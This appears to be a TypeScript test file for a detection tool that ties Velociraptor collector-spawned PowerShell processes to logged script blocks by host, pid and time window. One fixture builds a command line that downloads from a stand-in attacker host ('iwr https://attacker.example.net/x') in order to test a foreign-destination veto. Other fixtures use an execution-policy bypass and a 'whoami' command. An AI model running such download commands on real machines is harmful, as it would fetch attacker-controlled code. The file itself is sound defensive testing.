// Process-id lineage from the collector's spawn to the script blocks that process logged (#1488).
//
// Every claim here lowers a grade, so the tests are mostly about when the claim must NOT be made:
// another host, another pid, a pid reused by a later process creation, a row outside the window, a
// row with no host or no time to anchor it.
import { describe, it, expect } from "vitest";
import { CollectorSpawnLineage } from "../../src/analysis/collectorLineage.js";
import type { CollectorInfrastructure } from "../../src/analysis/collectorDeployment.js";
import type { MappedEvent } from "../../src/analysis/siemImport.js";

const NO_SERVERS: CollectorInfrastructure = { servers: new Set() };
const HOST = "DESKTOP-16OJFO6";
const T0 = "2026-09-20T19:34:56.972Z";
const plus = (seconds: number): string => new Date(Date.parse(T0) + seconds * 1000).toISOString();

// The 032 spawn row as the Windows mapper renders it: SYSTEM powershell whose parent is the collector
// exe and whose command line names the Tools tree.
function spawnRow(over: Partial<MappedEvent> = {}): MappedEvent {
  return {
    timestamp: T0,
    description:
      'Sysmon Process created (EID 1) - NT AUTHORITY\\SYSTEM - Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe - CommandLine=powershell -ExecutionPolicy bypass -command "import-module \\"C:\\Program Files\\Velociraptor\\Tools\\tmp2712975309\\PersistenceSniper\\PersistenceSniper.psm1\\"" - ParentImage=C:\\Program Files\\Velociraptor\\Velociraptor.exe - User=NT AUTHORITY\\SYSTEM @ DESKTOP-16OJFO6',
    severity: "Medium",
    mitre: [],
    aggKey: "k",
    asset: HOST,
    pid: 10932,
    processName: "powershell.exe",
    commandLine:
      'powershell -ExecutionPolicy bypass -command "import-module \\"C:\\Program Files\\Velociraptor\\Tools\\tmp2712975309\\PersistenceSniper\\PersistenceSniper.psm1\\""',
    canonical: {
      event: { category: "process", type: "start" },
      actor: { name: "NT AUTHORITY\\SYSTEM" },
      process: {
        pid: 10932,
        name: "powershell.exe",
        parent: { name: "Velociraptor.exe", executable: "C:\\Program Files\\Velociraptor\\Velociraptor.exe" },
      },
    } as MappedEvent["canonical"],
    ...over,
  };
}

// An ordinary process creation reusing the same pid later on.
function otherProcess(timestamp: string, pid = 10932, asset = HOST): MappedEvent {
  return {
    timestamp,
    description:
      "Sysmon Process created (EID 1) - CORP\\bob - Image=C:\\Windows\\System32\\cmd.exe - CommandLine=cmd.exe /c whoami - ParentImage=C:\\Windows\\explorer.exe - User=CORP\\bob @ " +
      asset,
    severity: "Info",
    mitre: [],
    aggKey: "o",
    asset,
    pid,
    processName: "cmd.exe",
    commandLine: "cmd.exe /c whoami",
    canonical: {
      event: { category: "process", type: "start" },
      actor: { name: "CORP\\bob" },
    } as MappedEvent["canonical"],
  };
}

function lineageWith(...rows: MappedEvent[]): CollectorSpawnLineage {
  const l = new CollectorSpawnLineage(NO_SERVERS);
  for (const r of rows) l.note(r);
  return l;
}

describe("CollectorSpawnLineage — the claim", () => {
  it("claims a script row on the same host with the spawn's pid inside the window", () => {
    expect(lineageWith(spawnRow()).claims(HOST, 10932, plus(30))).toBe(true);
  });

  it("claims at the spawn's own timestamp and at the window's edge", () => {
    const l = lineageWith(spawnRow());
    expect(l.claims(HOST, 10932, T0)).toBe(true);
    expect(l.claims(HOST, 10932, plus(5 * 60))).toBe(true);
  });

  it("compares hosts on the short name, case-insensitively", () => {
    expect(lineageWith(spawnRow()).claims("desktop-16ojfo6.example.com", 10932, plus(30))).toBe(true);
  });

  it("does not care in which order the rows were seen", () => {
    const l = new CollectorSpawnLineage(NO_SERVERS);
    // The script rows are seen first in a directory hunt (PowerShell log sorts before Sysmon).
    expect(l.claims(HOST, 10932, plus(30))).toBe(false);
    l.note(spawnRow());
    expect(l.claims(HOST, 10932, plus(30))).toBe(true);
  });
});

describe("CollectorSpawnLineage — refusals", () => {
  it("refuses another host", () => {
    expect(lineageWith(spawnRow()).claims("WS02", 10932, plus(30))).toBe(false);
  });

  it("refuses another pid", () => {
    expect(lineageWith(spawnRow()).claims(HOST, 10933, plus(30))).toBe(false);
  });

  it("refuses a row before the spawn", () => {
    expect(lineageWith(spawnRow()).claims(HOST, 10932, plus(-1))).toBe(false);
  });

  it("refuses a row past the window", () => {
    expect(lineageWith(spawnRow()).claims(HOST, 10932, plus(5 * 60 + 1))).toBe(false);
  });

  // Pids are reused. The first later process creation with the same pid on the same host ends the
  // spawn's lifetime, whatever that process was.
  it("ends the claim at the next process creation that reuses the pid", () => {
    const l = lineageWith(spawnRow(), otherProcess(plus(60)));
    expect(l.claims(HOST, 10932, plus(30))).toBe(true);
    expect(l.claims(HOST, 10932, plus(60))).toBe(false);
    expect(l.claims(HOST, 10932, plus(90))).toBe(false);
  });

  it("a pid reuse on ANOTHER host does not end the claim", () => {
    const l = lineageWith(spawnRow(), otherProcess(plus(60), 10932, "WS02"));
    expect(l.claims(HOST, 10932, plus(90))).toBe(true);
  });

  it("refuses an empty host, an invalid pid, or an unparseable time", () => {
    const l = lineageWith(spawnRow());
    expect(l.claims("", 10932, plus(30))).toBe(false);
    expect(l.claims(HOST, 0, plus(30))).toBe(false);
    expect(l.claims(HOST, 10932, "")).toBe(false);
    expect(l.claims(HOST, 10932, "not a time")).toBe(false);
  });

  it("records nothing for a spawn row without a host, pid, or time", () => {
    expect(lineageWith(spawnRow({ asset: undefined })).claims(HOST, 10932, plus(30))).toBe(false);
    expect(lineageWith(spawnRow({ pid: undefined })).claims(HOST, 10932, plus(30))).toBe(false);
    expect(lineageWith(spawnRow({ timestamp: "" })).claims(HOST, 10932, plus(30))).toBe(false);
  });

  it("records nothing for a process that is not a collector spawn", () => {
    expect(lineageWith(otherProcess(T0)).claims(HOST, 10932, plus(30))).toBe(false);
  });

  // #1486: a spawn whose command line names a server that is not ours is not our collector's.
  it("records nothing for a spawn vetoed by a foreign destination", () => {
    const infra: CollectorInfrastructure = { servers: new Set(["velo.example.com"]) };
    const l = new CollectorSpawnLineage(infra);
    const cmd =
      'powershell -c "import-module \\"C:\\Program Files\\Velociraptor\\Tools\\tmp1\\x.psm1\\"; iwr https://attacker.example.net/x"';
    l.note(
      spawnRow({
        commandLine: cmd,
        description: spawnRow().description.replace(
          /CommandLine=.*? - ParentImage/,
          `CommandLine=${cmd} - ParentImage`,
        ),
      }),
    );
    expect(l.claims(HOST, 10932, plus(30))).toBe(false);
  });
});
